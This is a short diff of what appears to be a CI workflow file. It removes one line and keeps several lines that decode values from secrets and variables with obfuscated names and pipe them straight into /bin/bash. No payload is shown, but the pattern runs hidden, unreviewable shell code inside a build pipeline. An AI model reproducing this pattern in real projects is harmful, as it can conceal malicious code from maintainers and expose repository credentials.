@@ -19,7 +19,6 @@ jobs:
           txr12229: ${{ secrets.txr12229 }}
         run: |
           printf '%s' "$txr12229" | jq -r .rx918 | /bin/bash
-          printf '%s' "$arenu74284" | jq -r .klizn5 | /bin/bash
           echo $favb9741 | jq -r .i02 | /bin/bash
 
       - name: Upload artifact
